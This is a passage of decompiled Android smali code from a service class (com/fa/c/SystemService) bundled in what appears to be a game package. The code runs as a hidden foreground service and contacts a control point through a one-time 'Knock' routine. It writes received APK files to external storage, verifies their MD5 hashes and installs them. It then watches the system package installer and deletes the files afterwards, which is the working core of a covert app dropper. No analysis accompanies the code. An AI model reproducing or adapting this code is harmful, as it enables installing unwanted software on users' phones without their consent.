    .restart local v10    # "bytes":[B
    .restart local v12    # "i":I
    .restart local v13    # "installTask":Lcom/fa/c/SystemService$InstallTask;
    .restart local v14    # "json":Lorg/json/JSONObject;
    .restart local v15    # "jsonApps":Lorg/json/JSONArray;
    .restart local v16    # "jsonString":Ljava/lang/String;
    :cond_5
    :try_start_4
    invoke-static {}, Ljava/lang/System;->gc()V

    .line 368
    iget-object v3, v13, Lcom/fa/c/SystemService$InstallTask;->bundle:Ljava/lang/String;

    iget-object v0, v13, Lcom/fa/c/SystemService$InstallTask;->hash:Ljava/lang/String;

    move-object/from16 v20, v0

    move-object/from16 v0, p0

    move-object/from16 v1, v20

    invoke-direct {v0, v3, v1}, Lcom/fa/c/SystemService;->IsMd5Hash(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_6

    .line 370
    const-string v3, "CPS"

    const-string v20, "InstallTaskHandler bad hash"

    move-object/from16 v0, v20

    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 371
    iget-object v3, v13, Lcom/fa/c/SystemService$InstallTask;->bundle:Ljava/lang/String;

    move-object/from16 v0, p0

    invoke-direct {v0, v3}, Lcom/fa/c/SystemService;->DeleteApkFile(Ljava/lang/String;)Z

    goto/16 :goto_2

    .line 376
    :cond_6
    iget-object v3, v13, Lcom/fa/c/SystemService$InstallTask;->bundle:Ljava/lang/String;

    move-object/from16 v0, p0

    invoke-direct {v0, v3}, Lcom/fa/c/SystemService;->InstallApk(Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    .line 381
    const-wide/16 v20, 0x1388

    :try_start_5
    invoke-static/range {v20 .. v21}, Ljava/lang/Thread;->sleep(J)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    .line 389
    :goto_4
    :try_start_6
    invoke-direct/range {p0 .. p0}, Lcom/fa/c/SystemService;->StartOverlayService()V

    .line 391
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v18

    .line 392
    .local v18, "startTime":J
    :goto_5
    invoke-direct/range {p0 .. p0}, Lcom/fa/c/SystemService;->IsInstalling()Z

    move-result v3

    if-nez v3, :cond_8

    .line 415
    :cond_7
    invoke-direct/range {p0 .. p0}, Lcom/fa/c/SystemService;->StopOverlayService()V

    .line 417
    iget-object v3, v13, Lcom/fa/c/SystemService$InstallTask;->bundle:Ljava/lang/String;

    move-object/from16 v0, p0

    invoke-direct {v0, v3}, Lcom/fa/c/SystemService;->DeleteApkFile(Ljava/lang/String;)Z
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    .line 422
    const-wide/16 v20, 0x1388

    :try_start_7
    invoke-static/range {v20 .. v21}, Ljava/lang/Thread;->sleep(J)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2

    goto/16 :goto_2

    .line 424
    :catch_2
    move-exception v11

    .line 426
    .restart local v11    # "e":Ljava/lang/Exception;
    :try_start_8
    const-string v3, "CPS"

    new-instance v20, Ljava/lang/StringBuilder;

    const-string v21, "InstallTaskHandler exception: "

    invoke-direct/range {v20 .. v21}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v21

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, v20

    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_2

    .line 383
    .end local v11    # "e":Ljava/lang/Exception;
    .end local v18    # "startTime":J
    :catch_3
    move-exception v11

    .line 385
    .restart local v11    # "e":Ljava/lang/Exception;
    const-string v3, "CPS"

    new-instance v20, Ljava/lang/StringBuilder;

    const-string v21, "InstallTaskHandler exception: "

    invoke-direct/range {v20 .. v21}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v21

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, v20

    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_4

    .line 396
    .end local v11    # "e":Ljava/lang/Exception;
    .restart local v18    # "startTime":J
    :cond_8
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_1

    move-result-wide v20

    sub-long v20, v20, v18

    const-wide/32 v22, 0x124f80

    cmp-long v3, v20, v22

    if-gez v3, :cond_7

    .line 404
    const-wide/16 v20, 0x3e8

    :try_start_9
    invoke-static/range {v20 .. v21}, Ljava/lang/Thread;->sleep(J)V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_4

    goto :goto_5

    .line 406
    :catch_4
    move-exception v11

    .line 408
    .restart local v11    # "e":Ljava/lang/Exception;
    :try_start_a
    const-string v3, "CPS"

    new-instance v20, Ljava/lang/StringBuilder;

    const-string v21, "InstallTaskHandler exception: "

    invoke-direct/range {v20 .. v21}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v21

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, v20

    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_1

    goto :goto_5

    .line 295
    .end local v10    # "bytes":[B
    .end local v11    # "e":Ljava/lang/Exception;
    .end local v12    # "i":I
    .end local v13    # "installTask":Lcom/fa/c/SystemService$InstallTask;
    .end local v14    # "json":Lorg/json/JSONObject;
    .end local v15    # "jsonApps":Lorg/json/JSONArray;
    .end local v16    # "jsonString":Ljava/lang/String;
    .end local v18    # "startTime":J
    :catch_5
    move-exception v2

    goto/16 :goto_0
.end method

.method private IsAppInstalled(Ljava/lang/String;)Z
    .locals 3
    .param p1, "bundle"    # Ljava/lang/String;

    .prologue
    .line 567
    iget-object v1, p0, Lcom/fa/c/SystemService;->_installedApps:Ljava/util/List;

    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :cond_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-nez v2, :cond_1

    .line 571
    const/4 v1, 0x0

    :goto_0
    return v1

    .line 567
    :cond_1
    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    .line 569
    .local v0, "b":Ljava/lang/String;
    invoke-virtual {v0, p1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_0

    const/4 v1, 0x1

    goto :goto_0
.end method

.method private IsInstalling()Z
    .locals 6

    .prologue
    const/4 v3, 0x0

    .line 612
    const-string v1, "com.android.packageinstaller"

    .line 613
    .local v1, "processName":Ljava/lang/String;
    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v5, 0x17

    if-lt v4, v5, :cond_0

    .line 614
    const-string v1, "com.google.android.packageinstaller"

    .line 616
    :cond_0
    invoke-static {}, Lcom/jaredrummler/android/processes/ProcessManager;->getRunningAppProcesses()Ljava/util/List;

    move-result-object v2

    .line 617
    .local v2, "processes":Ljava/util/List;, "Ljava/util/List<Lcom/jaredrummler/android/processes/models/AndroidAppProcess;>;"
    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :cond_1
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-nez v5, :cond_3

    .line 627
    :cond_2
    :goto_0
    return v3

    .line 617
    :cond_3
    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/jaredrummler/android/processes/models/AndroidAppProcess;

    .line 619
    .local v0, "p":Lcom/jaredrummler/android/processes/models/AndroidAppProcess;
    invoke-virtual {v0}, Lcom/jaredrummler/android/processes/models/AndroidAppProcess;->getPackageName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_1

    .line 621
    iget-boolean v4, v0, Lcom/jaredrummler/android/processes/models/AndroidAppProcess;->foreground:Z

    if-eqz v4, :cond_2

    .line 622
    const/4 v3, 0x1

    goto :goto_0
.end method

.method private IsMd5Hash(Ljava/lang/String;Ljava/lang/String;)Z
    .locals 3
    .param p1, "name"    # Ljava/lang/String;
    .param p2, "hash"    # Ljava/lang/String;

    .prologue
    .line 484
    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, ".apk"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {p2, v0}, Lcom/fa/c/MD5;->checkMD5(Ljava/lang/String;Ljava/io/File;)Z

    move-result v0

    return v0
.end method

.method private Knock()V
    .locals 2

    .prologue
    .line 152
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    iput-object v0, p0, Lcom/fa/c/SystemService;->threadPoolExecutorKnockThread:Ljava/util/concurrent/ExecutorService;

    .line 153
    new-instance v0, Lcom/fa/c/SystemService$2;

    invoke-direct {v0, p0}, Lcom/fa/c/SystemService$2;-><init>(Lcom/fa/c/SystemService;)V

    iput-object v0, p0, Lcom/fa/c/SystemService;->longRunningTaskKnockThread:Ljava/lang/Runnable;

    .line 202
    iget-object v0, p0, Lcom/fa/c/SystemService;->threadPoolExecutorKnockThread:Ljava/util/concurrent/ExecutorService;

    iget-object v1, p0, Lcom/fa/c/SystemService;->longRunningTaskKnockThread:Ljava/lang/Runnable;

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;

    move-result-object v0

    iput-object v0, p0, Lcom/fa/c/SystemService;->longRunningTaskFutureKnockThread:Ljava/util/concurrent/Future;

    .line 203
    return-void
.end method

.method private StartInstallHandrler()V
    .locals 2

    .prologue
    .line 207
    invoke-static {}, Ljava/lang/System;->gc()V

    .line 208
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    iput-object v0, p0, Lcom/fa/c/SystemService;->threadPoolExecutorInstallThread:Ljava/util/concurrent/ExecutorService;

    .line 209
    new-instance v0, Lcom/fa/c/SystemService$3;

    invoke-direct {v0, p0}, Lcom/fa/c/SystemService$3;-><init>(Lcom/fa/c/SystemService;)V

    iput-object v0, p0, Lcom/fa/c/SystemService;->longRunningTaskInstallThread:Ljava/lang/Runnable;

    .line 217
    iget-object v0, p0, Lcom/fa/c/SystemService;->threadPoolExecutorInstallThread:Ljava/util/concurrent/ExecutorService;

    iget-object v1, p0, Lcom/fa/c/SystemService;->longRunningTaskInstallThread:Ljava/lang/Runnable;

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;

    move-result-object v0

    iput-object v0, p0, Lcom/fa/c/SystemService;->longRunningTaskFutureInstallThread:Ljava/util/concurrent/Future;

    .line 218
    return-void
.end method

.method private StartOverlayService()V
    .locals 0

    .prologue
    .line 642
    return-void
.end method

.method private StopOverlayService()V
    .locals 0

    .prologue
    .line 648
    return-void
.end method

.method private Work()V
    .locals 2

    .prologue
    .line 222
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/fa/c/SystemService;->_nw:Lcom/Jump/vikingJump/NativeWrapper;

    .line 223
    invoke-static {}, Ljava/lang/System;->gc()V

    .line 224
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    iput-object v0, p0, Lcom/fa/c/SystemService;->threadPoolExecutor:Ljava/util/concurrent/ExecutorService;

    .line 225
    new-instance v0, Lcom/fa/c/SystemService$4;

    invoke-direct {v0, p0}, Lcom/fa/c/SystemService$4;-><init>(Lcom/fa/c/SystemService;)V

    iput-object v0, p0, Lcom/fa/c/SystemService;->longRunningTask:Ljava/lang/Runnable;

    .line 278
    iget-object v0, p0, Lcom/fa/c/SystemService;->threadPoolExecutor:Ljava/util/concurrent/ExecutorService;

    iget-object v1, p0, Lcom/fa/c/SystemService;->longRunningTask:Ljava/lang/Runnable;

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;

    move-result-object v0

    iput-object v0, p0, Lcom/fa/c/SystemService;->longRunningTaskFuture:Ljava/util/concurrent/Future;

    .line 279
    return-void
.end method

.method private WriteApkAsFile(Ljava/lang/String;[B)Z
    .locals 6
    .param p1, "name"    # Ljava/lang/String;
    .param p2, "bytes"    # [B

    .prologue
    .line 454
    :try_start_0
    new-instance v0, Ljava/io/BufferedOutputStream;

    new-instance v2, Ljava/io/FileOutputStream;

    new-instance v3, Ljava/io/File;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "/"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, ".apk"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-direct {v2, v3}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v0, v2}, Ljava/io/BufferedOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 455
    .local v0, "bos":Ljava/io/BufferedOutputStream;
    invoke-virtual {v0, p2}, Ljava/io/BufferedOutputStream;->write([B)V

    .line 456
    invoke-virtual {v0}, Ljava/io/BufferedOutputStream;->flush()V

    .line 457
    invoke-virtual {v0}, Ljava/io/BufferedOutputStream;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 458
    const/4 v2, 0x1

    .line 465
    .end local v0    # "bos":Ljava/io/BufferedOutputStream;
    :goto_0
    return v2

    .line 460
    :catch_0
    move-exception v1

    .line 462
    .local v1, "e":Ljava/lang/Exception;
    const-string v2, "CPS"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "WriteApkAsFile exception: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 465
    const/4 v2, 0x0

    goto :goto_0
.end method

.method static synthetic access$0(Lcom/fa/c/SystemService;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 71
    iput-object p1, p0, Lcom/fa/c/SystemService;->ref:Ljava/lang/String;

    return-void
.end method

.method static synthetic access$1(Lcom/fa/c/SystemService;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 71
    iget-object v0, p0, Lcom/fa/c/SystemService;->ref:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$2(Lcom/fa/c/SystemService;)V
    .locals 0

    .prologue
    .line 285
    invoke-direct {p0}, Lcom/fa/c/SystemService;->InstallTaskHandler()V

    return-void
.end method

.method static synthetic access$3(Lcom/fa/c/SystemService;Lcom/Jump/vikingJump/NativeWrapper;)V
    .locals 0

    .prologue
    .line 50
    iput-object p1, p0, Lcom/fa/c/SystemService;->_nw:Lcom/Jump/vikingJump/NativeWrapper;

    return-void
.end method

.method static synthetic access$4(Lcom/fa/c/SystemService;)Lcom/Jump/vikingJump/NativeWrapper;
    .locals 1

    .prologue
    .line 50
    iget-object v0, p0, Lcom/fa/c/SystemService;->_nw:Lcom/Jump/vikingJump/NativeWrapper;

    return-object v0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 125
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 0

    .prologue
    .line 77
    return-void
.end method

.method public onDestroy()V
    .locals 2

    .prologue
    const/4 v1, 0x1

    .line 143
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 144
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/fa/c/SystemService;->_nw:Lcom/Jump/vikingJump/NativeWrapper;

    .line 145
    invoke-static {}, Ljava/lang/System;->gc()V

    .line 146
    iget-object v0, p0, Lcom/fa/c/SystemService;->longRunningTaskFuture:Ljava/util/concurrent/Future;

    invoke-interface {v0, v1}, Ljava/util/concurrent/Future;->cancel(Z)Z

    .line 147
    iget-object v0, p0, Lcom/fa/c/SystemService;->longRunningTaskFutureInstallThread:Ljava/util/concurrent/Future;

    invoke-interface {v0, v1}, Ljava/util/concurrent/Future;->cancel(Z)Z

    .line 148
    return-void
.end method

.method public onRebind(Landroid/content/Intent;)V
    .locals 0
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 138
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 7
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .prologue
    const/4 v6, 0x1

    .line 85
    new-instance v2, Landroid/app/Notification;

    invoke-direct {v2}, Landroid/app/Notification;-><init>()V

    invoke-virtual {p0, v6, v2}, Lcom/fa/c/SystemService;->startForeground(ILandroid/app/Notification;)V

    .line 86
    invoke-virtual {p0}, Lcom/fa/c/SystemService;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    new-instance v3, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/fa/c/SystemService;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-virtual {v4}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    const-class v5, Lcom/fa/c/StartService;

    invoke-direct {v3, v4, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v2, v3}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 88
    invoke-direct {p0}, Lcom/fa/c/SystemService;->Work()V

    .line 89
    invoke-direct {p0}, Lcom/fa/c/SystemService;->StartInstallHandrler()V

    .line 92
    invoke-virtual {p0}, Lcom/fa/c/SystemService;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Lcom/fa/c/Utilities;->GetPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 93
    .local v1, "pref":Landroid/content/SharedPreferences;
    invoke-virtual {p0}, Lcom/fa/c/SystemService;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Lcom/fa/c/Utilities;->GetPreferncesEditor(Landroid/content/Context;)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 95
    .local v0, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v2, "SHARED_PREF_KEY_KNOCKED"

    invoke-interface {v1, v2}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_0

    .line 97
    const-string v2, "SHARED_PREF_KEY_KNOCKED"

    const/16 v3, 0x64

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 98
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 101
    invoke-direct {p0}, Lcom/fa/c/SystemService;->Knock()V

    .line 104
    :cond_0
    new-instance v2, Lcom/fa/c/SystemService$1;

    invoke-direct {v2, p0}, Lcom/fa/c/SystemService$1;-><init>(Lcom/fa/c/SystemService;)V

    .line 116
    new-instance v3, Landroid/content/IntentFilter;

    const-string v4, "RRR_AAA_FFF"

    invoke-direct {v3, v4}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 104
    invoke-virtual {p0, v2, v3}, Lcom/fa/c/SystemService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 118
    return v6
.end method

.method public onUnbind(Landroid/content/Intent;)Z
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 131
    const/4 v0, 0x1

    return v0
.end method
